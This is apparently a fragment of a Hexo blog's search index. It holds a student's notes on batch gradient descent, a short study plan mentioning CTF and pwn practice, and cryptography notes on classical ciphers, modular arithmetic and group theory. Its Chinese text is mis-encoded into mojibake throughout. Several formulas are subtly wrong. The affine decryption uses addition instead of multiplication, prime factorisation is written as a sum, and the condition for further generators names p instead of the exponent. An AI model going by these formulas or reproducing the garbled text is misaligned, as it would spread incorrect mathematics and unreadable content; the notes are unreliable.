\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$å’Œ$\theta_1$æƒ…å†µä¸‹çš„åå¯¼æ•°ï¼š</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>è¯¥æ–¹æ³•æ˜¯Batchæ¢¯åº¦ä¸‹é™æ³•ï¼šéœ€è¦éå†æ•´ä¸ªè®­ç»ƒé›†</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡åˆ’</title>
      <link href="2021/03/05/plan1/"/>
      <url>2021/03/05/plan1/</url>
      
        <content type="html"><![CDATA[<h2 id="è®¡åˆ’2021-3-2021-5"><a href="#è®¡åˆ’2021-3-2021-5" class="headerlink" title="è®¡åˆ’2021.3 - 2021.5"></a>è®¡åˆ’2021.3 - 2021.5</h2><blockquote><p>1.webå­¦ä¹ <br>2.buu pwné¢˜<br>3.æœºå™¨å­¦ä¹ å…¥é—¨<br>4.æ“ä½œç³»ç»Ÿ(ææ²»å†›è€å¸ˆ)<br>5.è¿ç»´(hvv)<br>åˆ’æ‰</p></blockquote><p>ç›®å‰å¤§äºŒï¼Œæƒ³å†²ä¸€ä¸‹ä¿ç ”çš„èµ„æ ¼ï¼Œctfè¦æç½®äº†è‰</p><blockquote><p>1.è“æ¡¥æ¯<br>2.æ•°å­¦å»ºæ¨¡<br>3.ciscn<br>4.è®ºæ–‡<br>5.è‹±è¯­</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦ç¬”è®°</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "><a href="#ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç " class="headerlink" title="ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "></a>ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç </h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>å¯†ç ç¼–ç å­¦</strong>å’Œå¯†ç åˆ†æå­¦</p><blockquote><p>Plaintext:æ˜æ–‡ï¼Œè¢«éšè”½æ¶ˆæ¯ï¼ŒM</p><p>Ciphertext:å¯†æ–‡ï¼ŒC</p><p>Encryption:åŠ å¯†</p><p>Decryption:è§£å¯†ï¼ŒåŠ å¯†çš„é€†è¿‡ç¨‹</p><p>Encryption algorithm: åŠ å¯†ç®—æ³•ï¼ŒE()</p><p>Decryption algorithm: è§£å¯†ç®—æ³•ï¼ŒD()</p><p>Key: å¯†é’¥ï¼Œæ§åˆ¶åŠ å¯†å’Œè§£å¯†ç®—æ³•æ“ä½œçš„æ•°æ®å¤„ç†ï¼Œåˆ†åˆ«ç§°ä½œåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ï¼Œk</p></blockquote><ul><li>ä¼ ç»Ÿå¯†ç ä½“åˆ¶æ‰€ç”¨çš„åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ç›¸åŒæˆ–<strong>å®è´¨ä¸Šç­‰åŒ</strong>ï¼Œä»ä¸€ä¸ªæ˜“äºæ¨å‡ºå¦ä¸€ä¸ªï¼šå•é’¥æˆ–å¯¹ç§°å¯†ç ä½“åˆ¶ï¼Œæ— æ³•å®ç°ä¸å¯å¦è®¤æ€§</li><li>åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ä¸ç›¸åŒï¼Œä»ä¸€ä¸ªéš¾äºæ¨å‡ºå¦ä¸€ä¸ªï¼ŒåŒé’¥ï¼Œæˆ–éå¯¹ç§°å¯†ç ä½“åˆ¶</li></ul><p>å¯†ç ä½“ç³»æ˜¯ä¸€ä¸ªäº”å…ƒç»„(M C K E D)</p><p>å¯†é’¥ç©ºé—´Kï¼Œåœ¨å•é’¥ä½“åˆ¶ä¸‹K1 = K2 = K</p><p>åŠ å¯†å˜æ¢$E_{k1}$</p><p>è§£å¯†å˜æ¢$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)ä¸ºä¿å¯†é€šä¿¡ç³»ç»Ÿ</strong></p><p>å¯†ç åˆ†æè€…ï¼Œé€‰å®šå˜æ¢å‡½æ•°hï¼Œå¯¹cè¿›è¡Œå˜æ¢ï¼Œå¾—åˆ°çš„æ˜æ–‡æ˜¯æ˜æ–‡ç©ºé—´ä¸­çš„æŸä¸ªå…ƒç´ ï¼Œ</p><p>å³$mâ€™ = h(x)$</p><p>å¦‚æœmâ€™ = mï¼Œåˆ™åˆ†ææˆåŠŸ</p><h3 id="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"><a href="#ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚" class="headerlink" title="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"></a>ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚</h3><ol><li>ç†è®ºä¸Šä¸å¯ç ´ï¼Œå³ $ p_r{mâ€™=m}=0 $ï¼Œå½“çŸ¥é“å·²çŸ¥çš„æ˜æ–‡å¯†æ–‡æ—¶ï¼Œè¦å†³å®šå¯†é’¥æˆ–ä»»æ„æ˜æ–‡åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li><li>KerchhoffåŸåˆ™ï¼Œä¿å¯†æ€§ä¸ä¾èµ–äºåŠ å¯†ä½“åˆ¶æˆ–ç®—æ³•çš„ä¿å¯†ï¼Œè€Œä¾èµ–äºå¯†é’¥</li><li>åŠ å¯†è§£å¯†ç®—æ³•é€‚ç”¨äºæ‰€æœ‰å¯†é’¥ç©ºé—´ä¸­çš„å…ƒç´ </li><li>ç³»ç»Ÿä¾¿äºå®ç°å’Œä½¿ç”¨</li></ol><h3 id="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"><a href="#å¯†ç ç³»ç»Ÿçš„æ”»å‡»" class="headerlink" title="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"></a>å¯†ç ç³»ç»Ÿçš„æ”»å‡»</h3><ul><li>æƒŸå¯†æ–‡æ”»å‡»</li><li>å·²çŸ¥æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©å¯†æ–‡æ”»å‡»</li></ul><div class="table-container"><table><thead><tr><th>æ”»å‡»ç±»å‹</th><th style="text-align:left">æ”»å‡»è€…æŒæ¡çš„å†…å®¹</th><th></th></tr></thead><tbody><tr><td>æƒŸå¯†æ–‡æ”»å‡»</td><td style="text-align:left">åŠ å¯†ç®—æ³•ï¼Œæˆªè·çš„éƒ¨åˆ†å¯†æ–‡</td><td></td></tr><tr><td>å·²çŸ¥æ˜æ–‡æ”»å‡»</td><td style="text-align:left">ä»¥ä¸ŠåŠä¸€ä¸ªæˆ–å¤šä¸ªæ˜æ–‡å¯†æ–‡å¯¹</td><td></td></tr><tr><td>é€‰æ‹©æ˜æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„æ˜æ–‡æ¶ˆæ¯åŠç”±å¯†é’¥äº§ç”Ÿçš„å¯†æ–‡</td><td></td></tr><tr><td>é€‰æ‹©å¯†æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„å¯†æ–‡æ¶ˆæ¯åŠç›¸åº”çš„è¢«è§£å¯†çš„æ˜æ–‡</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>æ— æ¡ä»¶å®‰å…¨ï¼šæ— è®ºæ•Œæ‰‹æˆªè·å¤šå°‘å¯†æ–‡ï¼ŒèŠ±è´¹å¤šé•¿æ—¶é—´éƒ½ä¸èƒ½è§£å¯†å¯†æ–‡ ï¼ˆä¸€æ¬¡ä¸€å¯†</p><p>è®¡ç®—ä¸Šå®‰å…¨ï¼š1ï¼Œç ´è¯‘å¯†æ–‡çš„ä»£ä»·è¶…è¿‡è¢«åŠ å¯†ä¿¡æ¯çš„ä»·å€¼ã€‚2ï¼Œç ´è¯‘å¯†æ–‡æ‰€èŠ±çš„æ—¶é—´è¶…è¿‡ä¿¡æ¯çš„æœ‰ç”¨æœŸã€‚</p><h2 id="å¯†ç å­¦å‘å±•"><a href="#å¯†ç å­¦å‘å±•" class="headerlink" title="å¯†ç å­¦å‘å±•"></a>å¯†ç å­¦å‘å±•</h2><p>Cryptology - å¯†ç å­¦</p><blockquote><p>ä¸‰ä¸ªé˜¶æ®µï¼š</p><p>1.1949ä¹‹å‰ï¼šå¤å…¸å¯†ç  è‰ºæœ¯</p><p>2.1949-1975ï¼šè¿‘ä»£å¯†ç  è‰ºæœ¯-&gt;ç§‘å­¦</p><p>3.1976å¹´è‡³ä»Šï¼šç°ä»£å¯†ç </p></blockquote><p>å¤å…¸å¯†ç ï¼š</p><ol><li>æ–¯å·´è¾¾æ£ã€‚ç®—æ³•æ˜¯ç¼ ç»•ï¼Œå¯†é’¥æ˜¯æ£å­çš„ç²—ç»†ã€‚</li><li>å•è¡¨ä»£æ¢å¯†ç ï¼šå‡¯æ’’å¯†ç ï¼Œå•å­—æ¯ä»£æ¢ã€‚ç®—æ³•æ˜¯ä»£æ¢ï¼Œå¯†é’¥æ˜¯å¯†ç è¡¨ã€‚</li><li>å¤šè¡¨ä»£æ¢å¯†ç ï¼šEnigmaå¯†ç æœºã€‚</li></ol><p>è¿‘ä»£å¯†ç ï¼š</p><ol><li>1977å¹´ï¼ŒNBSé¢å¸ƒé‡‡çº³IBMè®¾è®¡çš„æ–¹æ¡ˆä½œä¸ºéæœºå¯†æ•°æ®çš„æ•°æ®åŠ å¯†æ ‡å‡†DESï¼ŒData Encryption Standardã€‚</li><li>2001.11.16ï¼Œé‡‡ç”¨AESç®—æ³•</li><li>1976ï¼ŒW.Diffieï¼ŒM.E.Hellmanï¼Œæå‡ºéå¯¹ç§°å¯†ç ç®—æ³•æ€æƒ³</li><li>1977ï¼ŒRivestï¼ŒShamirï¼ŒAdlemanæå‡ºRSAå¯†ç ä½“åˆ¶</li></ol><p>å…¬é’¥å¯†ç å­¦å®ç°åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥çš„åˆ†ç¦»ï¼Œä¼Ÿå¤§é©å‘½ï¼Œä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ï¼šå…¬é’¥ï¼Œç§é’¥</p><h2 id="ä»¿å°„å˜æ¢"><a href="#ä»¿å°„å˜æ¢" class="headerlink" title="ä»¿å°„å˜æ¢"></a>ä»¿å°„å˜æ¢</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>å½“aå’Œ26äº’ä¸ºç´ æ•°çš„æ—¶å€™æ‰å¯ä»¥è§£å¯† æœ€å¤§å…¬å› å­ä¸º1æ—¶æ‰äº’ä¸ºç´ æ•° ï¼ˆä¸äº’ç´ çš„è¯é€†å…ƒæ±‚ä¸å‡ºæ¥ï¼Œå°±æ²¡æ³•è§£å¯†</p><p>abä¸ºå¯†é’¥</p><p>$a^{-1}$ä¸ºaçš„é€†å…ƒ</p><h3 id="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"><a href="#å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹" class="headerlink" title="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"></a>å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹</h3><p>é¢‘æ¬¡é—®é¢˜</p><p>ç›¸å¯¹ä½ç½®é—®é¢˜</p><h2 id="ç»´å‰å°¼äºšå¯†ç "><a href="#ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="ç»´å‰å°¼äºšå¯†ç "></a>ç»´å‰å°¼äºšå¯†ç </h2><p>åŠ å¯†ç®—æ³•</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.ç†è§£ä¿å¯†é€šä¿¡ç³»ç»Ÿæ¨¡å‹</p><p>2.å¯†ç ä½“åˆ¶ä»åŸç†åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå•é’¥å’ŒåŒé’¥ä½“åˆ¶</p><p>3.åŠ å¯†ç®—æ³•ä¸¤æ¡å®‰å…¨å‡†åˆ™</p><p>4.èƒ½å¤Ÿè®¡ç®—ä»¿å°„å˜æ¢</p><p>5.ç½®æ¢å¯†ç çš„æ“ä½œ</p><h1 id="äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"><a href="#äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†" class="headerlink" title="äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"></a>äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†</h1><h2 id="1-ç´ æ•°å’Œäº’ç´ "><a href="#1-ç´ æ•°å’Œäº’ç´ " class="headerlink" title="1.ç´ æ•°å’Œäº’ç´ "></a>1.ç´ æ•°å’Œäº’ç´ </h2><ul><li><p>å› å­</p><ul><li>bèƒ½æ•´é™¤aï¼Œb|a : bæ˜¯açš„å› å­</li><li>b|1    b = $\pm$1</li><li>b|a a|b åˆ™ a=$\pm$b</li><li>b|a  b|c. åˆ™å¯¹äºä»»æ„æ•´æ•°må’Œn  -&gt; b|(am+cn)</li></ul></li><li><p>ç´ æ•°</p><ul><li>ç´ æ•°æ˜¯ç°ä»£æ•°è®ºçš„æ ¸å¿ƒå†…å®¹</li><li>pçš„å› å­åªæœ‰ $\pm$1å’Œ $\pm$p</li><li>æ•´æ•°åˆ†è§£çš„å”¯ä¸€æ€§å®šç† ä»»ä¸€æ­£æ•´æ•°å¯ä»¥å”¯ä¸€åˆ†è§£æˆç´ æ•°çš„ä¹˜ç§¯<ul><li>$a = p_1^{e_1} + p_2^{e_2} + â€¦ + p_t^{e_t}$</li><li>$e_i$æ˜¯æ­£æ•´æ•° $p_i$æ˜¯ç´ æ•°</li></ul></li></ul></li><li><p>äº’ç´ æ•° </p><ul><li>cæ˜¯aå’Œbçš„æœ€å¤§å…¬å› å­ c=gcd(a,b)</li><li>å› ä¸ºæ‰€æœ‰ä¸ä¸º0çš„æ•´æ•°éƒ½æ˜¯0çš„å› å­ï¼Œå› æ­¤ï¼Œgcd(a,0) = |a|</li><li><p>å¦‚æœgcd(a,b) = 1ï¼Œåˆ™ç§°aï¼Œbæ˜¯äº’ç´ çš„</p></li><li><p>æœ€å°å…¬å€æ•° lcmã€‚dæ˜¯aå’Œbçš„æœ€å°å…¬å€æ•°ï¼Œd=lcm(a,b)</p></li><li>è‹¥gcd(a,b) = 1ï¼Œåˆ™lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-æ¨¡è¿ç®—"><a href="#2-æ¨¡è¿ç®—" class="headerlink" title="2.æ¨¡è¿ç®—"></a>2.æ¨¡è¿ç®—</h2><ul><li><p>æ•°è®º</p><ul><li><p>æ˜¯å¯†ç å­¦ç‰¹åˆ«æ˜¯å…¬é’¥å¯†ç å­¦çš„åŸºæœ¬å·¥å…·</p></li><li><p>ç¦»æ•£çš„æ•°å­—é›†åˆ</p></li><li><p>è¿ç®—æ˜¯æ¨¡åŠ ï¼Œæ¨¡å‡ï¼Œé€†è¿ç®—</p></li><li><p>å¯¹æ•´æ•°å’Œå¤šé¡¹å¼è¿›è¡Œæ¨¡è¿ç®—</p></li><li><p>å­—æ¯çš„é€šç”¨è¡¨ç¤ºï¼š</p><ul><li>n: éè´Ÿæ•´æ•°</li><li><p>p: ç´ æ•°</p></li><li><p>Z: æ•´æ•°é›†åˆ</p></li><li>R: å®æ•°é›†åˆ</li><li><p>Q: æœ‰ç†æ•°é›†åˆ</p></li><li><p>$Z_n$ = {0,1,2â€¦n-1}å°äºnçš„éè´Ÿæ•´æ•°é›†åˆ</p></li></ul></li></ul></li><li><p>æ¨¡è¿ç®—</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>åŒä½™</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) ç­‰ä»·a $\equiv$ b mod n</li></ul></li><li><p>åŒä½™æ€§è´¨</p><ul><li>a $\equiv$ b mod nï¼Œåˆ™b $\equiv$ a mod n</li><li>a $\equiv$ b mod nï¼Œb $\equiv$ c mod nï¼Œåˆ™a $\equiv$ c mod n</li><li>a $\equiv$ b mod nï¼Œdï½œnï¼Œåˆ™a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ï¼Œ d = lcm($n_1,n_2,â€¦n_k$)ï¼Œåˆ™a $\equiv$ b mod dï¼Œ(i = 1,2,â€¦,k)</li></ul></li><li><p>åŒä½™ç±»/ç­‰ä»·ç±»/æ¨¡nå‰©ä½™ç±»</p><ul><li>ä¸aæ¨¡nåŒä½™çš„å…¨ä½“æˆä¸ºaçš„åŒä½™ç±»è®°ä¸º$[a]_n$</li><li>$Z_n$ä¸ºæ¨¡nçš„ç­‰ä»·ç±»é›†åˆ</li></ul></li><li><p>ç­‰ä»·ç±»æ€§è´¨</p><ul><li>åœ¨åšmod nçš„åŠ æ³•å’Œä¹˜æ³•æ—¶ï¼Œç­‰ä»·ç±»çš„å…ƒç´ å¯ä»¥æ›¿æ¢ï¼Œç»“æœä¸å˜</li></ul></li><li><p>æ¨¡è¿ç®—æ€§è´¨</p><ul><li>åŠ è¿ç®—å’Œä¹˜è¿ç®—å…ˆåšæ¨¡å’Œååšæ¨¡ä¸å½±å“ç»“æœ</li><li>æ»¡è¶³äº¤æ¢å¾‹ï¼Œç»“åˆå¾‹ï¼Œåˆ†é…å¾‹</li><li>å•ä½å…ƒï¼Œ0æ˜¯åŠ æ³•å•ä½å…ƒï¼Œ1æ˜¯ä¹˜æ³•å•ä½å…ƒ</li></ul></li></ul><h2 id="3-æ¨¡æŒ‡æ•°è¿ç®—"><a href="#3-æ¨¡æŒ‡æ•°è¿ç®—" class="headerlink" title="3.æ¨¡æŒ‡æ•°è¿ç®—"></a>3.æ¨¡æŒ‡æ•°è¿ç®—</h2><p>æ¨¡æŒ‡æ•°è¿ç®—</p><ul><li>$a^m \pmod p$</li><li>æ€è·¯ï¼šç°å°†mç”¨äºŒè¿›åˆ¶è¡¨ç¤º</li><li>ï¼Ÿå¿«é€ŸæŒ‡æ•°è¿ç®—æŸ¥è¯¢</li><li>é˜¶ $ord_n(a)$ï¼Œ æ»¡è¶³ $a^m \equiv $ 1 mod n çš„æœ€å°æ­£æ•´æ•°mä¸ºæ¨¡nä¸‹açš„é˜¶</li><li>$ord_n(a)$ = mï¼Œ$ a^k \equiv 1$ mod nçš„å……è¦æ¡ä»¶æ˜¯kä¸ºmçš„å€æ•°</li></ul><h2 id="4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"><a href="#4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†" class="headerlink" title="4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"></a>4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†</h2><ul><li>è´¹é©¬å®šç†<ul><li>pæ˜¯ç´ æ•°ï¼Œaæ˜¯æ­£æ•´æ•°ï¼Œä¸”gcd(a,p) = 1,åˆ™$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p æˆ–è€… $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (æ»¡è¶³è´¹é©¬å®šç†ï¼Œå³$2^{12} \equiv 1$ mod 13ï¼Œå³$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-ç´ æ€§æ£€æµ‹"><a href="#5-ç´ æ€§æ£€æµ‹" class="headerlink" title="5.ç´ æ€§æ£€æµ‹"></a>5.ç´ æ€§æ£€æµ‹</h2><p>ç´ æ€§æ£€æµ‹å°±æ˜¯å¯¹ç»™å®šçš„æ•°æ£€éªŒæ˜¯å¦ä¸ºç´ æ•°</p><p>è´¹é©¬å®šç†çš„é€†å‘½é¢˜ä¸æˆç«‹ï¼Œä¼ªç´ æ•°ï¼ˆå¡ç±³æ­‡å°”æ•°ï¼‰</p><ul><li>åŸƒæ‹‰æ‰˜æ–¯æ•£ç­›æ³•</li><li><p>Miller-Rabinæ¦‚ç‡æ£€æµ‹æ³•</p><h2 id="6-æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#6-æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="6.æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>6.æ¬§å‡ é‡Œå¾—ç®—æ³•</h2></li></ul><p>è¾—è½¬ç›¸é™¤æ³•</p><h2 id="7-ä¸­å›½å‰©ä½™å®šç†"><a href="#7-ä¸­å›½å‰©ä½™å®šç†" class="headerlink" title="7.ä¸­å›½å‰©ä½™å®šç†"></a>7.ä¸­å›½å‰©ä½™å®šç†</h2><p>å°æ•°é‡æ„å¤§æ•°</p><p>å¤§æ•°ç”¨å°æ•°è¡¨ç¤º</p><h2 id="8-ç¾¤ç¯åŸŸ"><a href="#8-ç¾¤ç¯åŸŸ" class="headerlink" title="8.ç¾¤ç¯åŸŸ"></a>8.ç¾¤ç¯åŸŸ</h2><ul><li><p>ä»£æ•°ç³»ç»Ÿ</p><ul><li>ä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ç§æ•°å­¦æ¨¡å‹ï¼ŒåŒ…å«è¦å¤„ç†çš„æ•°å­¦å¯¹è±¡çš„é›†åˆåŠé›†åˆä¸Šçš„å…³ç³»æˆ–è¿ç®—ã€‚</li><li>ç¾¤ï¼Œç¯ï¼ŒåŸŸéƒ½æ˜¯ä»£æ•°ç³»ç»Ÿã€‚</li></ul></li><li><p>åŠç¾¤</p><ul><li>ä»»å–abå±äºSï¼Œaå’Œbçš„è¿ç®—*éƒ½åœ¨Sä¸­ï¼Œåˆ™Så¯¹è¿ç®—*æ˜¯å°é—­çš„</li><li>æ»¡è¶³ç»“åˆå¾‹</li><li>æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹ï¼Œç§°ä¸º<G,*>ä¸ºåŠç¾¤</li></ul></li><li><p>ç¾¤</p><ul><li>å°é—­æ€§</li><li>ç»“åˆå¾‹</li><li>å•ä½å…ƒï¼š$a<em>e = e</em>a = a$ï¼Œeç§°ä¸º$<G,*>$çš„å•ä½å…ƒ</li><li>é€†å…ƒï¼šå¯¹ä»»å–aå±äºGï¼Œå­˜åœ¨å…ƒç´ $a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>æ»¡è¶³ä»¥ä¸Šå‡ ç‚¹ç§°ä¸º$<G,*>$æ˜¯ç¾¤</li><li>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ </li><li>å®ä¾‹ XORï¼Œæ¨¡2åŠ </li><li>å®ä¾‹ï¼ŒåŠ æ³•ç¾¤<ul><li>å¯¹ä»»æ„nå¤§äºç­‰äº1ï¼Œæ•´æ•°æ¨¡nçš„é›†åˆæ„æˆä¸€ä¸ªåŒ…å«nä¸ªå…ƒç´ çš„æœ‰é™æ¨¡nåŠ æ³•ç¾¤ï¼Œå•ä½å…ƒæ˜¯0ï¼Œç¾¤ä¸­ä»»ä¸€å…ƒç´ aï¼Œå®ƒçš„é€†å…ƒæ˜¯n-aï¼Œè¿™ä¸ªç¾¤è®°ä¸º$Z_n$</li></ul></li><li><p>å®ä¾‹ï¼Œä¹˜æ³•ç¾¤ä¸æ˜¯ç¾¤ï¼Œæ˜¯å¹ºåŠç¾¤ï¼Œä¸æ»¡è¶³é€†å…ƒçš„æ¡ä»¶</p></li><li><p>ä¹˜æ³•ç¾¤ $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$ï¼Œå°äºnçš„éè´Ÿæ•´æ•°ä¸”ä¸näº’ç´ </li><li>æ¨¡nä¹˜æ³•ç¾¤ï¼Œå•ä½å…ƒe = 1</li><li>æ˜¯abelç¾¤ï¼Œ$|Z_n^*| = \psi(n)$</li><li>å¯¹ç´ æ•°pï¼Œ$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abelç¾¤</p><ul><li>è¿ç®—*è¡¨ç¤ºåŠ æ³•æ—¶ï¼Œç§°ä¸ºåŠ æ³•ç¾¤</li><li>ä¹˜æ³•ï¼Œä¹˜æ³•ç¾¤</li><li>è‹¥Gçš„å…ƒç´ æ˜¯æœ‰é™çš„ï¼Œç§°ä¸ºæœ‰é™ç¾¤ï¼Œå¦åˆ™ä¸ºæ— é™ç¾¤</li><li>æœ‰é™ç¾¤ä¸­ï¼ŒGçš„å…ƒç´ ä¸ªæ•°ç§°ä¸ºç¾¤Gçš„é˜¶æ•°ï¼Œè¡¨ç¤ºä¸º$|G|$ or $#G$</li><li>è¿˜æ»¡è¶³äº¤æ¢å¾‹ï¼Œåˆ™ç§°ä¸ºç¾¤$<G,*>$ä¸ºAbelç¾¤</li><li><p>å¯†ç å­¦ä¸­ç”¨åˆ°çš„å‡ ä¹éƒ½ä¸ºAbelç¾¤</p></li><li><p>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ ï¼Œé˜¶ä¸º8</p></li></ul></li></ul><ul><li>å¾ªç¯ç¾¤<ul><li>$g^i = a$ï¼Œaä¸ºä»»æ„çš„ä¸€ä¸ªå…ƒç´ ï¼Œgä¸ºç”Ÿæˆå…ƒæˆ–æœ¬åŸå…ƒ</li><li>å³èƒ½å¤Ÿè‡ªå·±å¯¹è‡ªå·±åšè¿ç®—ï¼Œæœ€ç»ˆèƒ½å¤Ÿéå†ç¾¤</li><li>å®ä¾‹<ul><li>$Z_4$</li><li>$Z_p^*$ï¼Œpä¸ºç´ æ•°ï¼Œè‚¯å®šå­˜åœ¨ç”Ÿæˆå…ƒ<ul><li>å®šç†$Z_n^*$æ¯ä¸€ä¸ªå…ƒç´ éƒ½æœ‰ä¹˜æ³•é€†å…ƒ</li><li>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ç”Ÿæˆå…ƒ</li></ul></li></ul></li><li>æœ¬åŸå…ƒçš„å­˜åœ¨æ€§<ul><li>å¯¹æ¨¡ç´ æ•°p<ul><li><ol><li>å…¶ç”Ÿæˆå…ƒå¿…å®šå­˜åœ¨</li><li>å½“gä¸ºç”Ÿæˆå…ƒä¸”pä¸p-1äº’ç´ æ—¶ï¼Œ$g^a$  mod pä¹Ÿæ˜¯ç”Ÿæˆå…ƒ</li><li>ç”Ÿæˆå…ƒä¸ªæ•°ä¸º$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>å…ƒç´ çš„é˜¶<ul><li>æ‹‰æ ¼æœ—æ—¥å®šç†æ¨è®ºï¼Œæä¾›äº†ç¾¤çš„é˜¶å’Œç¾¤ä¸­å…ƒç´ é˜¶çš„å…³ç³»</li></ul></li></ul><ul><li>ç¯<ul><li>$<R,+>$æ˜¯Abelç¾¤</li><li>$<R,*>$æ˜¯åŠç¾¤</li><li>åˆ†é…å¾‹</li><li>$<R,+,*>$æ˜¯ç¯</li></ul></li></ul><ul><li>åŸŸ<ul><li>$<F,+>$ æ˜¯Abelç¾¤ï¼Œ0æ˜¯+çš„å•ä½å…ƒ</li><li>$<F-0,*>$ æ˜¯Abelç¾¤</li><li>åˆ†é…å¾‹</li><li>$<F,+,*>$æ˜¯åŸŸ</li></ul></li></ul><ul><li>æœ‰é™åŸŸ<ul><li>è‹¥qæ˜¯ç´ æ•°çš„å¹‚ï¼Œå³$q = p^n$ ï¼Œpæ˜¯ç´ æ•°ï¼Œnæ˜¯æ­£æ•´æ•°ï¼Œåˆ™é˜¶ä¸ºqçš„åŸŸè®°ä¸ºGF(q)</li></ul></li></ul><h2 id="9-ç¦»æ•£å¯¹æ•°"><a href="#9-ç¦»æ•£å¯¹æ•°" class="headerlink" title="9.ç¦»æ•£å¯¹æ•°"></a>9.ç¦»æ•£å¯¹æ•°</h2><h2 id="10-å¹³æ–¹å‰©ä½™"><a href="#10-å¹³æ–¹å‰©ä½™" class="headerlink" title="10.å¹³æ–¹å‰©ä½™"></a>10.å¹³æ–¹å‰©ä½™</h2><h2 id="11-å°ç»“"><a href="#11-å°ç»“" class="headerlink" title="11.å°ç»“"></a>11.å°ç»“</h2><h1 id="ä¸‰-åº”ç”¨å¯†ç å­¦"><a 